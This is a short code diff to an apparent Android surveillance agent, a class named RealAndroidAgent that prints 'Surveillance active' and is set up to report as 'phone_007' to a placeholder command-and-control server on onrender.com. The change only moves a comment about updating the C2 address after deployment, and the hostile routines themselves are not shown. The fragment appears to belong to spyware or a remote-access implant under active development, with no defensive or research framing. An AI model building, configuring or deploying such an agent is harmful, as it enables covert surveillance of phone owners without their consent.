@@ -92,7 +92,8 @@ class RealAndroidAgent:
         print("✅ Surveillance active")
 
 def main():
-    C2_SERVER = "https://your-c2-server.onrender.com"  # Will be updated after deployment
+    # UPDATE THIS AFTER DEPLOYMENT
+    C2_SERVER = "https://your-c2-server.onrender.com"
     AGENT_ID = "phone_007"
     
     agent = RealAndroidAgent(AGENT_ID, C2_SERVER)
